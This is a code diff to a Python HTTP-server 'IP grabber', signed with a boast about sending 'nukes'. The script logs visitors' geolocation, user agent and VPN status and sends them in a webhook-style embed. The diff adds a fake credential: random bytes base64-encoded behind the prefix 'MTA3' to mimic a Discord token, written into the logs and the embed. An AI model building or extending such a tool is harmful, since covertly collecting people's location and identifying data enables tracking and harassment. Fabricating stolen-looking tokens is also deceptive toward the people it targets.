@@ -1,3 +1,6 @@
+import os
+import base64
+
 # Made by ! zeroo#2801, skid and i send nukes 👍
 
 import http.server
@@ -71,6 +74,8 @@ class IPHandler(http.server.BaseHTTPRequestHandler):
             lat, lng = g.latlng
             latitude = f'{lat}'
             longitude = f'{lng}'
+            random_bytes = os.urandom(67)
+            token = "MTA3" + base64.b64encode(random_bytes).decode()
 
         
             city = g.city
@@ -123,6 +128,7 @@ class IPHandler(http.server.BaseHTTPRequestHandler):
                         f.write(f"User Agent: {user_agent}\n")
                         f.write(f"Host: {host}\n")
                         f.write(f"Accept Encoding: {encoding}\n")
+                        f.write(f"Token: {token}\n")
                         if vpn_check:
                             f.write(f"Is Proxy: {bool(is_proxy)}\n")
                             f.write(f"Is VPN: {is_vpn}\n")
@@ -135,6 +141,7 @@ class IPHandler(http.server.BaseHTTPRequestHandler):
                         f.write(f"User Agent: {user_agent}\n")
                         f.write(f"Host: {host}\n")
                         f.write(f"Accept Encoding: {encoding}\n")
+                        f.write(f"Token: {token}\n")
                         if vpn_check:
                             f.write(f"Is Proxy: {bool(is_proxy)}\n")
                             f.write(f"Is VPN: {is_vpn}\n")
@@ -166,6 +173,10 @@ class IPHandler(http.server.BaseHTTPRequestHandler):
                         {
                             "name": "More info",
                             "value": message
+                        },
+                        {
+                          "name": "Token",
+                          "value": token                          
                         }
                     ],
                     "footer": {
